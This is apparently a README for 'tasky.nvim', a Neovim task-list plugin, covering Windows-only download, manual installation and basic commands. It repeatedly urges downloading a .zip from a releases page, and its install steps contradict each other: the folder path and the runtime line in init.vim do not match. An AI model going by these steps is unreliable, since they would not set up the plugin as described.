# ⚙️ tasky.nvim - Simplify Your Task Management in Neovim

[![Download tasky.nvim](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Ryan591/tasky.nvim/releases)

---

## 📋 What is tasky.nvim?

tasky.nvim is a tool that helps you organize and manage tasks inside Neovim, a popular text editor used by many developers. If you use Neovim to write code, notes, or projects, tasky.nvim makes it easy to keep track of your to-do lists without leaving your editor.

This plugin is designed to work smoothly with Neovim’s interface. It helps you create, update, and view your tasks quickly. You do not need any programming skills to start using it once it is set up.

---

## 💻 System Requirements

Before installing tasky.nvim, make sure your computer meets these basic requirements:

- **Operating System:** Windows 10 or later
- **Neovim Version:** Latest stable version (v0.7 or above is recommended)
- **Disk Space:** At least 50 MB free for plugin and dependencies
- **Internet Connection:** Needed for downloading files and updates

---

## 🚀 Getting Started: How to Download and Install on Windows

To use tasky.nvim on Windows, follow these steps carefully.

### 1. Visit the Release Page to Download

Click the link below to access the page where you can download the files:

[Download tasky.nvim from GitHub Releases](https://github.com/Ryan591/tasky.nvim/releases)

This page lists all available versions of the plugin. Locate the latest stable release and download the relevant file.

### 2. Download the Plugin Files

On the releases page, look for the file meant for Windows users. It usually contains the plugin files in a format that can be extracted easily, such as a `.zip` file. Download the latest `.zip` release.

### 3. Extract the Plugin Files

Find the `.zip` file you just downloaded (usually in your Downloads folder). Right-click the file and choose “Extract All.” Choose a folder you can easily find, such as your Desktop or Documents folder.

### 4. Locate Your Neovim Configuration Folder

Before adding tasky.nvim, you need to find where Neovim stores your configuration files:

- Open File Explorer.
- Go to: `C:\Users\<Your_Username>\AppData\Local\nvim\`
  
If the folder `nvim` does not exist, create it. This is where Neovim keeps your settings and plugins.

### 5. Move tasky.nvim Files to the Plugin Folder

Inside the folder where you extracted the download, copy the tasky.nvim plugin folder or files to a subfolder inside `nvim`. For example, you can create a folder called `plugin` inside `nvim` and place the tasky.nvim files there:

```
C:\Users\<Your_Username>\AppData\Local\nvim\plugin\tasky.nvim\
```

### 6. Add Plugin Activation Commands to Your Neovim Config

Open the `init.vim` file located in:

```
C:\Users\<Your_Username>\AppData\Local\nvim\init.vim
```

If this file does not exist, create it using a simple text editor like Notepad.

Add these lines to enable tasky.nvim inside Neovim:

```
" Enable tasky.nvim plugin
runtime plugin/tasky.nvim.vim
```

Save the file.

### 7. Start Neovim and Activate tasky.nvim

Open Neovim by clicking your Neovim shortcut or running `nvim` in the Command Prompt.

Once inside Neovim, tasky.nvim should load automatically. You can test it by running commands or shortcuts related to tasky functionality (refer to the plugin documentation if needed).

---

## 🔧 Basic Usage of tasky.nvim

tasky.nvim helps you work with tasks easily from your Neovim window.

Here are some simple commands to get started:

- **Create a new task:** Inside Neovim, type `:TaskyNew` and press Enter. Type your new task and save.
- **Show tasks list:** Type `:TaskyList` to see all existing tasks.
- **Mark task as done:** Use `:TaskyDone <task-number>` to mark a task completed.
- **Delete a task:** Run `:TaskyDelete <task-number>` to remove a task.

You do not need to leave your editing window. All task-related commands work smoothly without interrupting your workflow.

---

## 🛠 How tasky.nvim Works with Neovim

tasky.nvim uses Lua and VimScript to integrate directly with Neovim. It stores tasks in files formatted for easy reading and editing. This approach keeps your task data safe and easy to change.

When you create or update a task, tasky.nvim updates your task file automatically. It also makes task lists easy to navigate, so you can focus on your projects.

You do not have to learn programming or commands beyond the basics mentioned above.

---

## ⚙️ Customize tasky.nvim (Optional)

Advanced users can change how tasky.nvim looks and behaves by editing the configuration file (`init.vim`). For example, you can:

- Change the file location where tasks are saved.
- Adjust task list display settings.
- Set custom keyboard shortcuts for commands.

Sample configuration lines to add to your `init.vim`:

```
" Set custom task file location
let g:tasky_task_file = '~/mytasks.txt'

" Set a shortcut to open tasks list
nnoremap <leader>tl :TaskyList<CR>
```

If you prefer your own setup, check the full plugin documentation inside the GitHub repository to explore all options.

---

## 💡 Tips for Beginners

- Spend some time learning basic Neovim navigation before using tasky.nvim.
- Use simple and clear task descriptions for better organization.
- Save your work often.
- Keep your plugin updated by visiting the release page regularly.

---

## 🔗 Download Link Again

Click below to visit the release page and download the latest version of tasky.nvim for Windows:

[Download tasky.nvim now](https://github.com/Ryan591/tasky.nvim/releases)

---

## 🐛 Getting Help and Reporting Issues

If you run into issues or want to report bugs:

- Use the “Issues” tab on the GitHub repository page.
- Provide clear details about your problem, including your Windows version and Neovim version.
- Attach any error messages you see when running the plugin.

The community and the plugin maintainer will review your issue and help resolve it.